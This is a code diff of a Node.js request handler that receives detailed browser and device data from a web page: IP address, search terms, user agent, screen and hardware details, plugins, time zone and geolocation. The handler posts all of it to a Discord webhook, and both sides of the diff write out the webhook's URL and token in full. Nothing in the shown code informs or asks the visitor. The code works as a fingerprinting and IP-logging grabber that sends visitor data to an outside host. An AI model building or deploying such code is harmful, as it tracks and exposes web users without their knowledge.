@@ -2,99 +2,76 @@ import fetch from 'node-fetch';
 
 export default async (req, res) => {
     if (req.method === 'POST') {
-        const discordWebhookUrl = 'https://discord.com/api/webhooks/1303414607263826002/8u9YBbZiHiRm1dE2cO_wUFFYe6YFTkkouDgoZt-LIYTwVhtYJa1_AM-qDxXajHpWnnsT';
-        const vpnApiUrl = 'https://vpnapi.io/api/{API_KEY}'; // Replace {API_KEY} with your actual VPN API key
+        const discordWebhookUrl = 'https://discord.com/api/webhooks/1303414607263826002/8u9YBbZiHiRm1dE2cO_wUFFYe6YFTkkouDgoZt-LIYTwVhtYJa1_AM-qDxXajHpWnnsT'; // Your Discord webhook URL
 
         try {
-            const {
-                ip,
-                searchTerm,
-                userAgent,
-                browserLanguage,
-                osInfo,
-                browserVersion,
+            const { 
+                ip, 
+                searchTerm, 
+                userAgent, 
+                referrer, 
+                currentURL, 
+                screenWidth, 
+                screenHeight, 
+                browserLanguage, 
+                timeZone, 
+                osInfo, 
+                timestamp,
                 connectionType,
-                timeZone,
+                browserVersion,
                 deviceMemory,
                 hardwareConcurrency,
                 pixelRatio,
                 onlineStatus,
                 viewportWidth,
                 viewportHeight,
-                screenWidth,
-                screenHeight,
                 colorDepth,
                 touchSupport,
                 cookiesEnabled,
                 plugins,
-                referrer,
-                currentURL,
-                timestamp
+                geoLocation // Geolocation (from frontend)
             } = req.body;
 
-            // Get public IP from headers (proxy/IP forwarding)
-            const publicIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+            // Check if required data is defined
+            if (!ip || !userAgent) {
+                return res.status(400).json({ message: 'Missing required data.' });
+            }
 
-            // Call the VPN detection API
-            const vpnResponse = await fetch(`${vpnApiUrl}?ip=${publicIP}`);
-            const vpnData = await vpnResponse.json();
-
-            // VPN API will return details about the IP
-            const isVPN = vpnData.security.is_vpn || false;
-            const vpnProvider = vpnData.security.vpn_provider || 'Unknown';
-            const isProxy = vpnData.security.is_proxy || false;
-            const isTor = vpnData.security.is_tor || false;
-
-            // Get geolocation info
-            const geoLocation = vpnData.location || {};
-
-            // Log the gathered information to Discord
+            // Send the collected information to Discord
             const logMessage = {
                 embeds: [
                     {
                         title: 'User Data Logged',
                         description: `
-                            **Public IP:** \`${publicIP || 'N/A'}\`
-                            **Private IP:** \`${ip || 'N/A'}\`
+                            **Private IP:** \`${ip}\`
                             **Search Term:** \`${searchTerm || 'No search term entered'}\`
-                            **User Agent:** \`${userAgent || 'N/A'}\`
-                            **Browser Language:** \`${browserLanguage || 'N/A'}\`
-                            **Operating System:** \`${osInfo || 'N/A'}\`
-                            **Browser Version:** \`${browserVersion || 'N/A'}\`
-                            **Connection Type:** \`${connectionType || 'N/A'}\`
-                            **Time Zone:** \`${timeZone || 'N/A'}\`
-                            **Device Memory:** \`${deviceMemory || 'N/A'} GB\`
-                            **Hardware Concurrency:** \`${hardwareConcurrency || 'N/A'}\`
-                            **Pixel Ratio:** \`${pixelRatio || 'N/A'}\`
-                            **Online Status:** \`${onlineStatus || 'N/A'}\`
-                            **Viewport Size:** \`${viewportWidth || 'N/A'} x ${viewportHeight || 'N/A'}\`
-                            **Screen Resolution:** \`${screenWidth || 'N/A'} x ${screenHeight || 'N/A'}\`
-                            **Color Depth:** \`${colorDepth || 'N/A'}\`
-                            **Touch Support:** \`${touchSupport || 'N/A'}\`
-                            **Cookies Enabled:** \`${cookiesEnabled || 'N/A'}\`
-                            **Browser Plugins:** \`${plugins || 'N/A'}\`
+                            **User Agent:** \`${userAgent}\`
+                            **Browser Language:** \`${browserLanguage}\`
+                            **Operating System:** \`${osInfo}\`
+                            **Browser Version:** \`${browserVersion}\`
+                            **Connection Type:** \`${connectionType}\`
+                            **Time Zone:** \`${timeZone}\`
+                            **Device Memory:** \`${deviceMemory} GB\`
+                            **Hardware Concurrency:** \`${hardwareConcurrency}\`
+                            **Pixel Ratio:** \`${pixelRatio}\`
+                            **Online Status:** \`${onlineStatus}\`
+                            **Viewport Size:** \`${viewportWidth} x ${viewportHeight}\`
+                            **Screen Resolution:** \`${screenWidth} x ${screenHeight}\`
+                            **Color Depth:** \`${colorDepth}\`
+                            **Touch Support:** \`${touchSupport}\`
+                            **Cookies Enabled:** \`${cookiesEnabled}\`
+                            **Browser Plugins:** \`${plugins}\`
                             **Referrer URL:** \`${referrer || 'No referrer'}\`
-                            **Current URL:** \`${currentURL || 'N/A'}\`
-                            **Timestamp:** \`${timestamp || new Date().toISOString()}\`
-
-                            **Geolocation Information:**
-                            - Country: \`${geoLocation.country || 'N/A'}\`
-                            - Region: \`${geoLocation.region || 'N/A'}\`
-                            - City: \`${geoLocation.city || 'N/A'}\`
-
-                            **VPN/Proxy Information:**
-                            - VPN Detected: \`${isVPN ? 'Yes' : 'No'}\`
-                            - VPN Provider: \`${vpnProvider}\`
-                            - Proxy Detected: \`${isProxy ? 'Yes' : 'No'}\`
-                            - Tor Detected: \`${isTor ? 'Yes' : 'No'}\`
+                            **Current URL:** \`${currentURL}\`
+                            **GeoLocation:** \`${geoLocation || 'Unknown'}\`
+                            **Timestamp:** \`${timestamp}\`
                         `,
-                        color: 0x00FF00,
+                        color: 0xFF0000, // Red color
                         timestamp: new Date(),
                     },
                 ],
             };
 
-            // Send data to Discord
             const response = await fetch(discordWebhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
